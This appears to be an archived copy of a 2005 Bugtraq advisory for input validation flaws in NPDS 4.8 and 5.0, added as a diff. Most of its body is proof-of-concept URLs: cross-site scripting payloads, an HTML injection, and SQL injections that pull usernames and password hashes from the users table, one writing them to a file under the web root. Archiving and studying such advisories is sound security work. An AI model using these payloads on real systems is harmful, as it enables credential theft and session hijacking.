@@ -1,0 +1,99 @@
+#SpeeDr00t@Black Falcon<br>#bid13803<p><b><span style="font-size: 18pt;">NPDS Multiple Input Validation Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/13803/info">info</a><br><a href="http://www.securityfocus.com/bid/13803/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/13803/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/13803/solution">solution</a><br><a href="http://www.securityfocus.com/bid/13803/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				13803
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				May 28 2005 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				May 28 2005 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Discovery is credited to NoSP &lt;nosp@thehackademy.net&gt; and Romano &lt;romano_45@hotmail.com&gt;.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					NPDS NPDS 5.0 <br/>
+					
+				
+					NPDS NPDS 4.8 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>#<a href="https://github.com/SpeeDr00t/speedr00t.github.com/blob/master/securityfocus/0x14000/13803/npds_sql_poc">#exploit_npds_sql_poc</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	No exploit is required. <br/><br/>Proof of concept examples are available:<br/><br/>Cross-site Scripting:<br/>http://www.example.com/npds/admin.php?mainfile=e&amp;language=&amp;lt;script&amp;gt;alert(document.cookie);&amp;lt;/script&amp;gt;<br/><br/>http://www.example.com/npds/powerpack_f.php?language=&amp;lt;script&amp;gt;alert()&amp;lt;/script&amp;gt;<br/>//idem pr push.php<br/><br/>http://www.example.com/npds/sdv_infos.php?sitename=&amp;lt;script&amp;gt;alert()&amp;lt;/script&amp;gt;<br/><br/>http://www.example.com/faq.php?myfaq=ys&amp;id_cat=99&amp;categories=&amp;lt;script&amp;gt;alert()&amp;lt;/script&amp;gt;<br/><br/>http://www.example.com/modules.php?ModPath=glossaire&amp;ModStart=glossaire&amp;op=rech_lettre&amp;lettre=&amp;lt;script&amp;gt;alert()&amp;lt;/script&amp;gt;<br/><br/>http://www.example.com/reviews.php?op=postcomment&amp;id=1&amp;title=%3Cscript%3Ealert();%3C/script%3E<br/><br/>HTML injection:<br/>http://www.example.com/reply.php?post=1&amp;forum=1&amp;topic=1&amp;stop=2&amp;image_subject="&gt;&amp;lt;script&amp;gt;alert('je viens de recuperer ton<br/>cookie');&amp;lt;/script&amp;gt;&amp;userdata='&amp;time='&amp;poster_ip='&amp;hostname='&amp;message=test&amp;submit=Valider<br/><br/>SQL injection:<br/>http://www.example.com/modules.php?ModPath=glossaire&amp;ModStart=glossaire&amp;op=rech_terme&amp;type=3&amp;terme=''%20='%20AND%20affiche!='0'%20UNION%20SELECT%200,0,uname,pass,0,0%20from%20user<br/>s%20where%20uname&lt;&gt;''/*<br/><br/>http://www.example.com/links.php?op=search&amp;query=google%'%20UNION%20SELECT%200,uname,pass,0,0,0,0,0%20FROM%20users%20where%20uname&lt;&gt;''%20INTO%20OUTFILE%20'/var/www/html/npds/sql/s<br/>qlinjection.txt'/*
+	
+		<ul>
+<li><a href="/data/vulnerabilities/exploits/npds_sql_poc">/data/vulnerabilities/exploits/npds_sql_poc</a></li>
+</ul>
+</div>
